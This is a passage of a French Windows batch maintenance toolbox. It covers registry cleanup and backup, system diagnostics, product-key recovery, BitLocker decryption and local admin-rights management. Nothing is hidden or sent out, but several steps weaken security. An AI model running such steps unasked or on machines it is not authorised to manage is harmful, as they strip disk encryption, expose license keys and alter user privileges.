reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d 0 /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f >nul
echo Termine ! Fini les pubs de jeux preinstalles dans Windows.
pause
goto sys_tweaks_menu

:sys_registry_cleanup
cls
echo ======================================================
echo Nettoyage ^& optimisation avances du Registre
echo ======================================================
setlocal enabledelayedexpansion

set backupFolder=%SystemRoot%\Temp\RegistryBackups
if not exist "%backupFolder%" mkdir "%backupFolder%"

set logFile=%SystemRoot%\Temp\RegistryCleanupLog.txt
echo Journal de nettoyage du Registre - %date% %time% > "%logFile%"

set count=0
set safe_count=0

echo Analyse du Registre Windows pour les erreurs et problemes de performance...
for /f "tokens=*" %%A in ('reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall 2^>nul') do (
    set /a count+=1
    set entries[!count!]=%%A

    echo %%A | findstr /I "IE40 IE4Data DirectDrawEx DXM_Runtime SchedulingAgent" >nul && (
        set /a safe_count+=1
        set safe_entries[!safe_count!]=%%A
    )
)

if %count%==0 (
    echo Aucune entree superflue trouvee dans le Registre.
    pause
    goto system_tools
)

echo %count% problemes potentiels detectes dans le Registre:
for /L %%i in (1,1,%count%) do echo [%%i] !entries[%%i]!
echo.
echo Sans risque a supprimer (%safe_count% entrees detectees):
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
echo [A] Supprimer uniquement les entrees sures
if %safe_count% GTR 0 echo [B] Revoir les entrees sures avant suppression
echo [C] Creer une sauvegarde du Registre
echo [D] Restaurer une sauvegarde du Registre
echo [E] Verifier les corruptions du Registre
echo [0] Annuler
echo.
set /p reg_choice=Votre choix: 

for %%A in (%reg_choice%) do set reg_choice=%%A
if /i "%reg_choice%"=="0" goto sys_opti_menu
if /i "%reg_choice%"=="A" goto delete_safe_reg_entries
if /i "%reg_choice%"=="B" goto review_safe_reg_entries
if /i "%reg_choice%"=="C" goto create_reg_backup
if /i "%reg_choice%"=="D" goto restore_reg_backup
if /i "%reg_choice%"=="E" goto scan_registry
if "%reg_choice%"=="" goto sys_opti_menu

echo Saisie invalide, retour au menu.
pause
goto sys_registry_cleanup

:delete_safe_reg_entries
if %safe_count%==0 (
    echo Aucune entree sure a supprimer.
    pause
    goto sys_registry_cleanup
)
echo Suppression de toutes les entrees sures detectees...
for /L %%i in (1,1,%safe_count%) do (
    echo Suppression de !safe_entries[%%i]!...
    reg delete "!safe_entries[%%i]!" /f
    echo Supprime: !safe_entries[%%i]! >> "%logFile%"
)
echo Suppression terminee.
pause
goto sys_registry_cleanup

:review_safe_reg_entries
cls
echo Entrees du Registre sures a supprimer:
for /L %%i in (1,1,%safe_count%) do echo [%%i] !safe_entries[%%i]!
echo.
> "%TEMP%\yn_confirm.ps1" echo $sel = 1
>> "%TEMP%\yn_confirm.ps1" echo function Show-Choice {
>> "%TEMP%\yn_confirm.ps1" echo     param($s)
>> "%TEMP%\yn_confirm.ps1" echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo     Write-Host "  Supprimer toutes ces entrees ?  " -NoNewline
>> "%TEMP%\yn_confirm.ps1" echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray }
>> "%TEMP%\yn_confirm.ps1" echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo while ($true) {
>> "%TEMP%\yn_confirm.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\yn_confirm.ps1" echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') {
>> "%TEMP%\yn_confirm.ps1" echo         $sel = 1 - $sel
>> "%TEMP%\yn_confirm.ps1" echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c
>> "%TEMP%\yn_confirm.ps1" echo         Show-Choice $sel
>> "%TEMP%\yn_confirm.ps1" echo     } elseif ($k.Key -eq 'Enter') { break }
>> "%TEMP%\yn_confirm.ps1" echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break }
>> "%TEMP%\yn_confirm.ps1" echo }
>> "%TEMP%\yn_confirm.ps1" echo Write-Host ""
>> "%TEMP%\yn_confirm.ps1" echo exit $sel
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\yn_confirm.ps1"
set "_YN=%errorlevel%"
del /f /q "%TEMP%\yn_confirm.ps1" 2>nul
if "%_YN%"=="0" goto delete_safe_reg_entries
echo Operation annulee.
pause
goto sys_registry_cleanup

:create_reg_backup
set backupName=RegistryBackup_%date:~-4,4%-%date:~-7,2%-%date:~-10,2%_%time:~0,2%-%time:~3,2%.reg
echo Creation de la sauvegarde: %backupFolder%\%backupName%...
reg export HKLM "%backupFolder%\%backupName%" /y
echo Sauvegarde creee avec succes.
pause
goto sys_registry_cleanup

:restore_reg_backup
echo Sauvegardes disponibles:
dir /b "%backupFolder%\*.reg"
echo Entrez le nom de la sauvegarde a restaurer:
set /p backupFile=
if exist "%backupFolder%\%backupFile%" (
    echo Restauration en cours...
    reg import "%backupFolder%\%backupFile%"
    echo Restauration effectuee avec succes.
) else (
    echo Fichier de sauvegarde introuvable. Verifiez le nom et reessayez.
)
pause
goto sys_registry_cleanup

:scan_registry
cls
echo Verification des corruptions du Registre...
sfc /scannow
dism /online /cleanup-image /checkhealth
echo Verification terminee. Si des erreurs ont ete trouvees, redemarrez votre PC.
pause
goto sys_registry_cleanup

:sys_drivers
cls
echo Enregistrement de la liste des pilotes sur le Bureau...
driverquery /v > "%USERPROFILE%\Desktop\Pilotes_installes.txt"
echo.
echo Le rapport des pilotes a ete enregistre ici :
echo %USERPROFILE%\Desktop\Pilotes_installes.txt
pause
goto sys_export_menu

:sys_diagnostic_menu
set "diag_back=sys_diagnostic_menu"
set "in_hw_test="
call :AutoMenu "ANALYSE ET DIAGNOSTIC SYSTEME" "[--- GENERAL ET SYSTEME ---];sys_report;sys_temp_report;sys_hw_test;sys_event_log;[--- BATTERIE ET ALIMENTATION ---];sys_battery_report;sys_battery_status;sys_battery_energy;[--- MEMOIRE VIVE (RAM) ---];sys_ram_check;hw_ram_test;sys_ram_usage;[--- STOCKAGE ET DISQUES ---];hw_smart;sys_bitlocker_check;[--- RESEAU ET CONNECTIVITE ---];sys_diag_network;[--- SECURITE ET ANTIVIRUS ---];sys_defender"
if "%errorlevel%"=="0" (
    set "diag_back="
    goto system_tools
)
goto !AutoMenu_Target!

:sys_report
cls
echo Diagnostic et integration de memoire en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS SYSTEME' -f Cyan; Write-Host ('   Nom du PC : '+$env:COMPUTERNAME); Write-Host ('   Systeme   : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Version   : '+$os.Version); Write-Host ''; Write-Host '   COMPOSANTS MATERIELS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Type : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (Espace libre)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Disque '+$_.DeviceID+' : '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU ACTIF' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP : '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=if((Get-Tpm).TpmPresent){'Present'}else{'Absent'}; Write-Host ('   Puce TPM   : '+$t) } catch { Write-Host '   Puce TPM   : Absent ou desactive' }"
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

:sys_repair_icons
cls
echo ===============================================
echo      Reparation du Cache des Icones/Miniatures
echo ===============================================
echo.
echo Arret de l'explorateur Windows...
taskkill /f /im explorer.exe >nul 2>&1
echo Reparation en cours (Suppression du cache)...
timeout /t 2 /nobreak >nul
del /A /F /Q "%localappdata%\IconCache.db" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\iconcache*" >nul 2>&1
del /A /F /Q "%localappdata%\Microsoft\Windows\Explorer\thumbcache*" >nul 2>&1
echo Redemarrage de l'explorateur Windows...
start explorer.exe
echo.
echo [OK] Le cache des icones a ete vide !
echo Il se reconstruira progressivement et reparera vos icones.
pause
goto sys_export_menu

REM ===================================================================
REM              MENU DES EXTRACTIONS ET SAUVEGARDES
REM ===================================================================
:sys_export_menu
call :AutoMenu "MENU EXTRACTION ET SAUVEGARDE" "[--- INFORMATIONS ET CLES ---];sys_win_key;sys_drivers;[--- LISTES DE LOGICIELS ET RESEAUX ---];sys_export_software;sys_export_wifi_apps"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:sys_win_key
set "opts=Cle Windows OEM (Incrustee au BIOS);Cle Windows Actuelle (Installee);Cle Produit Office (via CMD)"
call :DynamicMenu "RECUPERATION DE CLES DE PRODUIT" "%opts%"
set "wk_choice=%errorlevel%"

if "%wk_choice%"=="1" goto win_key_oem
if "%wk_choice%"=="2" goto win_key_registry
if "%wk_choice%"=="3" goto win_key_office
if "%wk_choice%"=="0" goto sys_export_menu
goto sys_win_key

:win_key_oem
cls
echo ===============================================
echo      Cle Windows OEM (Carte mere / BIOS)
echo ===============================================
echo.
echo Interrogation du firmware...
powershell -NoProfile -Command "$k = (Get-CimInstance -Query 'Select * from SoftwareLicensingService' -ErrorAction SilentlyContinue).OA3xOriginalProductKey; if([string]::IsNullOrWhiteSpace($k)) { Write-Host '[ECHEC] Aucune cle OEM detectee.' ; Write-Host 'Cela signifie que ce PC ne contenait pas de licence incluse a l''achat' ; Write-Host 'ou utilise une licence numerique liee a un compte Microsoft.' } else { Write-Host '[OK] Cle de produit Windows (OEM) detectee :'; Write-Host ''; Write-Host ('    ' + $k) -ForegroundColor Green; Write-Host ''; Write-Host 'Cette cle est incrustee dans la carte mere.' }"
echo.
pause
goto sys_win_key

:win_key_registry
cls
echo ===============================================
echo      Cle Windows Installee (Registre)
echo ===============================================
echo.
echo Recherche de la cle actuellement utilisee par Windows...
set "WINKEY="
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v BackupProductKeyDefault 2^>nul ^| findstr /i "BackupProductKeyDefault"') do (
    set "WINKEY=%%A"
)
if "!WINKEY!"=="" (
    echo [ECHEC] Impossible de lire la cle par defaut dans le registre.
) else (
    echo [OK] Cle Windows installee :
    echo.
    powershell -NoProfile -Command "Write-Host '    !WINKEY!' -ForegroundColor Green"
    echo.
)
pause
goto sys_win_key

:win_key_office
cls
echo ===============================================
echo      Cle de produit Microsoft Office
echo ===============================================
echo.
echo Recherche des licences Office installees...
echo.
set "office_vbs="
if exist "%ProgramFiles%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles%\Microsoft Office\Office16\ospp.vbs"
if exist "%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs" set "office_vbs=%ProgramFiles(x86)%\Microsoft Office\Office16\ospp.vbs"

if "!office_vbs!"=="" (
    echo [INFO] Script de statut Office non trouve ^(ospp.vbs^).
    echo Si Office est installe, sa version est peut-etre differente ^(pas 2016/2019/365^).
) else (
    echo [INFO] Depuis Office 2013, Microsoft masque volontairement
    echo la cle de licence complete sur votre ordinateur par securite.
    echo Seuls les 5 derniers caracteres sont stockes sur ce PC.
    echo.
    powershell -NoProfile -Command "$raw = cscript //nologo '!office_vbs!' /dstatus; $matches = $raw | Select-String -Pattern 'KEY'; if ($matches) { foreach($m in $matches) { Write-Host '   '$m.Line.Trim() -ForegroundColor Cyan } } else { Write-Host 'Aucune cle detectee ou en mode Abonnement / Inactif.' -ForegroundColor Yellow }"
)
echo.
pause
goto sys_win_key

:sys_god_mode
cls
echo ===============================================
echo      Creation du dossier "God Mode"
echo ===============================================
echo.
echo Le "God Mode" centralise tous les parametres de Windows
echo (+ de 200 options^) dans un seul et meme dossier.
echo.
set "GODMODE_PATH=%USERPROFILE%\Desktop\God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"
if exist "!GODMODE_PATH!" (
    echo [INFO] Le dossier God Mode existe deja sur votre Bureau.
) else (
    mkdir "!GODMODE_PATH!" >nul 2>&1
    if !errorlevel!==0 (
        echo [OK] Le dossier God Mode a ete cree sur votre Bureau !
    ) else (
        echo [ECHEC] Impossible de creer le dossier.
    )
)
echo.
pause
goto system_tools

:sys_battery_report
cls
echo ===============================================
echo      Rapport de Batterie (Sante et Usure)
echo ===============================================
echo.
echo Analyse de la batterie en cours...
powercfg /batteryreport /output "%TEMP%\battery_report_tmp.html" >nul 2>&1
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$r='%TEMP%\battery_report_tmp.html';if(Test-Path $r){$c=Get-Content $r -Raw;$d=0;$f=0;if($c -match '(?s)DESIGN CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$d=[int]($matches[1] -replace '\D','')};if($c -match '(?s)FULL CHARGE CAPACITY.*?([\d\s,\xA0]+)\s*mWh'){$f=[int]($matches[1] -replace '\D','')};if($d -gt 0){$h=[math]::Round(($f/$d)*100,2);if($h -gt 100){$h=100};$w=[math]::Round(100-$h,2);if($w -lt 0){$w=0};Write-Host ('  - Capacite d''usine : '+$d+' mWh') -f Cyan;Write-Host ('  - Capacite actuelle : '+$f+' mWh') -f Cyan;Write-Host ('  - Sante de la batterie : '+$h+'%%') -f Green;Write-Host ('  - Niveau d''usure : '+$w+'%%') -f Yellow}else{Write-Host 'Impossible de lire les donnees de capacite. (PC Fixe ou pas de batterie ?)' -f Red}}else{Write-Host 'Le fichier de rapport n''a pas pu etre cree.' -f Red}"
echo.
echo -----------------------------------------------
echo  Generer le rapport complet sur le Bureau ?
echo  (Historique, Cycles, Details)
echo -----------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$sel=0;$done=$false;[Console]::CursorVisible=$false;while(-not $done){if($sel -eq 0){Write-Host '  [>] Oui ' -f Green;Write-Host '  [ ] Non ' -f DarkGray}else{Write-Host '  [ ] Oui ' -f DarkGray;Write-Host '  [>] Non ' -f Red};$k=[Console]::ReadKey($true);switch($k.Key){'UpArrow'{$sel=1-$sel}'DownArrow'{$sel=1-$sel}'Enter'{$done=$true}};if(-not $done){[Console]::SetCursorPosition(0,[Console]::CursorTop-2)}};[Console]::CursorVisible=$true;exit $sel"
set "bat_choice=%errorlevel%"
if "%bat_choice%"=="0" goto sys_battery_save
if "%bat_choice%"=="1" goto sys_battery_cleanup
goto sys_battery_cleanup

:sys_battery_save
copy /y "%TEMP%\battery_report_tmp.html" "%USERPROFILE%\Desktop\battery_report.html" >nul 2>&1
del /f /q "%TEMP%\battery_report_tmp.html" >nul 2>&1
echo.
echo [OK] Le rapport complet a ete enregistre sur votre Bureau :
echo battery_report.html
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

:sys_battery_cleanup
del /f /q "%TEMP%\battery_report_tmp.html" >nul 2>&1
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

REM ===================================================================
REM              STATUT BATTERIE EN DIRECT
REM ===================================================================
:sys_battery_status
cls
echo ===============================================
echo      STATUT BATTERIE EN DIRECT
echo ===============================================
echo.
echo Lecture des donnees batterie en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$b = Get-CimInstance Win32_Battery -EA SilentlyContinue; if ($b) { $statMap = @{ 1='Autre'; 2='Debranchee (decharge)'; 3='Totalement chargee'; 4='Faible'; 5='Critique'; 6='En charge'; 7='Chargee - haute'; 8='Chargee - basse'; 9='Chargee - critique'; 10='Indefini'; 11='Partiellement chargee' }; $stat = if ($statMap.ContainsKey([int]$b.BatteryStatus)) { $statMap[[int]$b.BatteryStatus] } else { 'Sur secteur / Connectee' }; $charge = $b.EstimatedChargeRemaining; $col = if ($charge -ge 60) { 'Green' } elseif ($charge -ge 30) { 'Yellow' } else { 'Red' }; $volt = if ($b.DesignVoltage) { [math]::Round($b.DesignVoltage / 1000, 2).ToString() + ' V' } else { 'N/A' }; Write-Host ''; Write-Host '  BATTERIE DETECTEE' -f Cyan; Write-Host ('   Modele          : ' + $b.Name) -f White; Write-Host ('   Charge actuelle : ' + $charge + '%%') -f $col; Write-Host ('   Statut          : ' + $stat) -f White; Write-Host ('   Tension design  : ' + $volt) -f White; Write-Host ''; if ($b.BatteryStatus -eq 3) { Write-Host '  [OK] La batterie est pleinement chargee.' -f Green } elseif ($b.BatteryStatus -eq 6) { Write-Host '  [OK] Batterie en cours de charge.' -f Yellow } elseif ($charge -lt 20) { Write-Host '  [CRITIQUE] Niveau de batterie critique !' -f Red } elseif ($charge -lt 40) { Write-Host '  [ATTENTION] Niveau de batterie bas.' -f Yellow } } else { Write-Host '' -f Red; Write-Host '  [INFO] Aucune batterie detectee. (PC de bureau ?)' -f Yellow }"
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

REM ===================================================================
REM              AUDIT ENERGETIQUE WINDOWS (powercfg /energy)
REM ===================================================================
:sys_battery_energy
cls
echo ===============================================
echo      AUDIT ENERGETIQUE WINDOWS
echo ===============================================
echo.
echo Analyse de la consommation energetique en cours...
echo (60 secondes d'observation - soyez patient)
echo.
set "ENERGY_LOG=%USERPROFILE%\Desktop\audit_energie.html"
powercfg /energy /output "%ENERGY_LOG%" /duration 10 >nul 2>&1
if exist "%ENERGY_LOG%" (
    powershell -NoProfile -Command "$c = Get-Content '%ENERGY_LOG%' -Raw -Encoding UTF8 -ErrorAction SilentlyContinue; $errors = [regex]::Matches($c, 'ENERGY_ERROR[^<]*'); Write-Host ('  ' + $errors.Count + ' anomalie(s) energetique(s) detectee(s)') -f $(if($errors.Count -eq 0){'Green'}else{'Yellow'}); $warnings = [regex]::Matches($c, 'ENERGY_WARNING[^<]*'); Write-Host ('  ' + $warnings.Count + ' avertissement(s) energetique(s)') -f $(if($warnings.Count -eq 0){'Green'}else{'DarkYellow'})"
    echo.
    echo [OK] Rapport complet enregistre sur le Bureau :
    echo %ENERGY_LOG%
) else (
    powershell -NoProfile -Command "Write-Host '  [INFO] Rapport non genere (droits admin requis).' -f Yellow"
)
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

REM ===================================================================
REM              CONSOMMATION RAM EN DIRECT
REM ===================================================================
:sys_ram_usage
cls
echo ===============================================
echo      CONSOMMATION RAM EN DIRECT
echo ===============================================
echo.
echo Analyse de la memoire en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $totalMo = [math]::Round($os.TotalVisibleMemorySize / 1024, 1); $freeMo = [math]::Round($os.FreePhysicalMemory / 1024, 1); $usedMo = [math]::Round($totalMo - $freeMo, 1); $pct = [math]::Round(($usedMo / $totalMo) * 100, 1); $colPct = if ($pct -lt 70) { 'Green' } elseif ($pct -lt 85) { 'Yellow' } else { 'Red' }; Write-Host ''; Write-Host '  USAGE MEMOIRE' -f Cyan; Write-Host ('   Total       : ' + $totalMo + ' Mo  (' + [math]::Round($totalMo/1024,1) + ' Go)') -f White; Write-Host ('   Utilise     : ' + $usedMo + ' Mo  (' + [math]::Round($usedMo/1024,1) + ' Go)') -f $colPct; Write-Host ('   Disponible  : ' + $freeMo + ' Mo  (' + [math]::Round($freeMo/1024,1) + ' Go)') -f White; Write-Host ('   Utilisation : ' + $pct + '%%') -f $colPct; Write-Host ''; Write-Host '  TOP 10 PROCESSUS (RAM)' -f Cyan; Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 10 | ForEach-Object { $mo = [math]::Round($_.WorkingSet64 / 1MB, 1); $name = $_.ProcessName.PadRight(28); Write-Host ('   ' + $name + ' : ' + $mo + ' Mo') -f $(if($mo -gt 500){'Red'}elseif($mo -gt 200){'Yellow'}else{'Gray'}) }; Write-Host ''"
echo.
pause
if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)

:sys_bitlocker_check
cls
echo ===============================================
echo     Verification chiffrement BitLocker / Dechiffrage
echo ===============================================
echo.

set "vol_opts="
set "vol_count=0"
for /f "tokens=1,* delims=|" %%A in ('powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Where-Object {($_.DriveType -eq 3 -or $_.DriveType -eq 2) -and $_.Size -gt 0} | ForEach-Object { $_.DeviceID + '|Lecteur ' + $_.DeviceID + ' ' + $_.VolumeName + ' (' + [math]::Round($_.Size/1GB,1) + ' Go)' }"') do (
    set /a vol_count+=1
    set "vol_letter[!vol_count!]=%%A"
    set "single_vol=%%A"
    if defined vol_opts (
        set "vol_opts=!vol_opts!;%%B"
    ) else (
        set "vol_opts=%%B"
    )
)

if !vol_count! equ 0 (
    echo [ECHEC] Aucun lecteur local detecte.
    pause
    goto system_tools
)

if !vol_count! equ 1 (
    set "dl=!single_vol!"
) else (
    call :DynamicMenu "CHOISISSEZ LE LECTEUR A VERIFIER" "!vol_opts!"
    set "v_choice=!errorlevel!"
    if "!v_choice!"=="0" goto system_tools
    
    for %%I in (!v_choice!) do set "dl=!vol_letter[%%I]!"
)

cls
echo Verification du statut BitLocker pour !dl! ...
manage-bde -status !dl! > "%TEMP%\bde_status.txt" 2>&1
type "%TEMP%\bde_status.txt"
echo.
rem Detection fiable (compatible FR/EN) pour eviter de proposer de dechiffrer un lecteur deja clair.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$src=Get-Content '%TEMP%\bde_status.txt' -Raw; if ($src -match 'Protection\s+On' -or $src -match 'Protection\s+activ' -or $src -match '100\.0\s*%%' -or $src -match '100\,0\s*%%') { exit 1 } else { exit 0 }"
if !errorlevel! equ 0 (
    echo.
    echo Ce lecteur ne semble pas chiffre ou n'a pas termine de l'etre. 
    echo Aucune action necessaire.
    pause
    if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)
)

echo.
echo -----------------------------------------------
echo  Le lecteur est chiffre. Lancer le dechiffrement ?
echo -----------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$sel=0;$done=$false;[Console]::CursorVisible=$false;while(-not $done){if($sel -eq 0){Write-Host '  [>] Oui ' -f Green;Write-Host '  [ ] Non ' -f DarkGray}else{Write-Host '  [ ] Oui ' -f DarkGray;Write-Host '  [>] Non ' -f Red};$k=[Console]::ReadKey($true);switch($k.Key){'UpArrow'{$sel=1-$sel}'DownArrow'{$sel=1-$sel}'Enter'{$done=$true}};if(-not $done){[Console]::SetCursorPosition(0,[Console]::CursorTop-2)}};[Console]::CursorVisible=$true;exit $sel"
set "bde_choice=%errorlevel%"
if "%bde_choice%"=="0" (
    echo.
    echo Lancement du dechiffrement de %dl% ...
    manage-bde -off %dl%
    echo Commande envoyee. Le processus peut prendre du temps.
    pause
    if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)
) else (
    echo.
    echo Operation annulee.
    pause
    if defined diag_back (goto !diag_back!) else (goto sys_diagnostic_menu)
)

REM ================= Embedded: Gestion des utilisateurs locaux (um_*) =================
:um_menu
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
for /f "usebackq tokens=*" %%G in (`powershell -NoProfile -Command "$n=([System.Security.Principal.SecurityIdentifier]::new('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]; Write-Output $n"`) do set "UM_ADMIN_GROUP=%%G"
if not defined UM_ADMIN_GROUP set "UM_ADMIN_GROUP=Administrators"
net localgroup "%UM_ADMIN_GROUP%" >nul 2>&1 || set "UM_ADMIN_GROUP=Administrateurs"
set "UM_STR_PWD_REQ_EN=Password required"
set "UM_STR_PWD_REQ_FR=Mot de passe requis"

call :AutoMenu "GESTION UTILISATEURS LOCAUX" "um_list;um_add;um_del;um_admin;um_reset;um_remove_pwd;um_superadmin"
if "%errorlevel%"=="0" goto system_tools
goto !AutoMenu_Target!

:um_list
cls
echo Utilisateur           Admin   Actif   MDPDefini
echo ------------------------------------------------
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $adminGroups=@('Administrators','Administrateurs'); $admins=@(); foreach($g in $adminGroups){ try{ $admins+=$(Get-LocalGroupMember -Group $g -ErrorAction Stop | ForEach-Object { $_.Name.Split('\\')[-1] }) } catch{} }; $admins = $admins | Sort-Object -Unique; Get-LocalUser | Where-Object Enabled | Sort-Object Name | ForEach-Object { $u=$_; $has=$false; try { $pls = $u | Select-Object -ExpandProperty PasswordLastSet -ErrorAction Stop; if ($pls) { $has=$true } } catch {}; if (-not $has) { try { $nu = net user \"$($u.Name)\" 2>$null; $line = $nu | Where-Object { $_ -match '^(Password last set|Dernier changement du mot de passe)\s+' }; if ($line) { $val = ($line -split '\\s{2,}',2)[1].Trim(); if ($val -and $val -notmatch '^(Never|Jamais)$') { $has=$true } } } catch {} }; if (-not $has -and $u.PasswordRequired) { $has=$true }; [PSCustomObject]@{ Utilisateur=$u.Name; Admin= if($admins -contains $u.Name){'Oui'}else{'Non'}; Actif= if($u.Enabled){'Oui'}else{'Non'}; MDPDefini= if($has){'Oui'}else{'Non'} } } | Format-Table -AutoSize -HideTableHeaders" || echo Erreur lors de la liste
echo.
pause
goto um_menu

:um_admin
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUT/RETRAIT DROITS ADMIN" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "UADM=!user_arr[%res%]!"
if not defined UADM goto um_menu

set "opts=Ajouter aux Administrateurs;Retirer des Administrateurs"
call :DynamicMenu "ACTION POUR !UADM!" "%opts%"
set "OP=%errorlevel%"

if "%OP%"=="1" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /add
    if !errorlevel!==0 (echo '%UADM%' a ete ajoute aux Administrateurs.) else (echo Echec.)
) else if "%OP%"=="2" (
    net localgroup "%UM_ADMIN_GROUP%" "%UADM%" /delete
    if !errorlevel!==0 (echo '%UADM%' a ete retire des Administrateurs.) else (echo Echec.)
)
pause
goto um_menu

:um_add
cls
call :um_show_active
set "NEWU="
> "%TEMP%\um_input.ps1" echo $buf = ""
>> "%TEMP%\um_input.ps1" echo Write-Host "  Nom d'utilisateur : " -NoNewline -ForegroundColor Cyan
>> "%TEMP%\um_input.ps1" echo while ($true) {
>> "%TEMP%\um_input.ps1" echo     $k = [Console]::ReadKey($true)
>> "%TEMP%\um_input.ps1" echo     if ($k.Key -eq 'Enter') { break }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Escape') { $buf = ""; break }
>> "%TEMP%\um_input.ps1" echo     elseif ($k.Key -eq 'Backspace') {
>> "%TEMP%\um_input.ps1" echo         if ($buf.Length -gt 0) { $buf = $buf.Substring(0, $buf.Length - 1); Write-Host "`b `b" -NoNewline }
>> "%TEMP%\um_input.ps1" echo     } else {
>> "%TEMP%\um_input.ps1" echo         $c = $k.KeyChar
>> "%TEMP%\um_input.ps1" echo         if ([char]::IsLetterOrDigit($c) -or $c -in @([char]'_',[char]'-',[char]'.')) { $buf += $c; Write-Host $c -NoNewline }
>> "%TEMP%\um_input.ps1" echo     }
>> "%TEMP%\um_input.ps1" echo }
>> "%TEMP%\um_input.ps1" echo Write-Host ""
